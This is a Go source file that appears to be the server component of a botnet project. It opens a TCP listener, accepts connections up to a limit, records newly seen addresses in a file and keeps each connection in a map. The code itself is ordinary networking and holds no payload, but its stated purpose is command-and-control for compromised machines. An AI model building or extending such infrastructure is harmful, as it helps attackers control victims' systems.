// Manages server functionality

package net

import (
	. "botnet/server/util"
	"log"
	"net"
)

func StartServer() {
	listener, err := net.Listen("tcp", ":" + Config.Port)
	if err != nil {
		log.Fatalf("Failed to start server: %s", err.Error())
		return
	}

	Info("Server running on port :%s", Config.Port)	

	for {
		conn, err := listener.Accept()

		if err != nil {
			Error("Failed to accept connection, %s", err.Error())
			continue
		}

		if len(Connections) == Config.ConnectionLimit {
			conn.Close()
			Warning("Client is trying to connect, but maximum connections reached.")
			continue
		}

		addr := conn.LocalAddr().String()

		_, ok := Connections[addr]
		if !ok {
			AppendFile(KnownAddressesPath, addr + "\n")
		}

		Connections[addr] = &conn
	}
}